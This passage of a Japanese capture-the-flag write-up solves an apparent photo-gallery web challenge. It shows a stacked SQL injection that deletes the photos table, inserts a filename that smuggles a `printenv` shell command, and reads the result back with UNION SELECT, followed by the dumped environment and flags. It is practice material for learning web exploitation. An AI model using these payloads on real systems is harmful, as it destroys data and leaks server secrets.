Space used: /bin/sh: 1: echoPYTHONIOENCODING=UTF-8: not found
```
`;echo$(printenv)| tr -d "\n"`で1行にまとめられると思ったけど、`.strip().rsplit('\n', 1)[-1]`で改行を区切り文字として最後の要素を取り出すのでこの場合は`"`が取り出されてしまう。  
`0;DELETE from photos;commit;INSERT INTO photos (title, filename,parent) VALUES (';printenv>files/output1', ';printenv>files/output1',1); commit;`としてファイルに結果を書きこんでからそれを表示すれば解決した。  
`0 union select 'files/output1'`  
```txt
PYTHONIOENCODING=UTF-8 UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi 
SUPERVISOR_GROUP_NAME=uwsgi FLAGS=
["^FLAG^59540711ea6225ea8310897c6baa3a11b287c7e8dcad02a1bb2b3275666ec6b5$FLAG$", 
"^FLAG^b92cc0e313bc00b1548c0563c26f15d5c32690694e49707ed32192036b499674$FLAG$", 
"^FLAG^aa435df54317de31f5da65f7fd430f78ebcdc51825f124624b232cf00b367efe$FLAG$"] 
HOSTNAME=0afaf3213fe1 SHLVL=0 PYTHON_PIP_VERSION=18.1 HOME=/root 
GPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF UWSGI_INI=/app/uwsgi.ini NGINX_MAX_UPLOAD=0 
UWSGI_PROCESSES=16 STATIC_URL=/static UWSGI_CHEAPER=2 NGINX_VERSION=1.13.12-1~stretch 
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
NJS_VERSION=1.13.12.0.2.0-1~stretch LANG=C.UTF-8 SUPERVISOR_ENABLED=1 PYTHON_VERSION=2.7.15 
NGINX_WORKER_PROCESSES=1 SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock 
SUPERVISOR_PROCESS_NAME=uwsgi LISTEN_PORT=80 STATIC_INDEX=0 PWD=/app STATIC_PATH=/app/static 
PYTHONPATH=/app UWSGI_RELOADS=0
```
# メモ
https://www.hamayanhamayan.com/entry/2020/06/25/222618  
https://graneed.hatenablog.com/entry/2019/12/29/115100#SQL-Injection  
https://graneed.hatenablog.com/entry/2018/12/16/003745  
https://sqliteonline.com/  
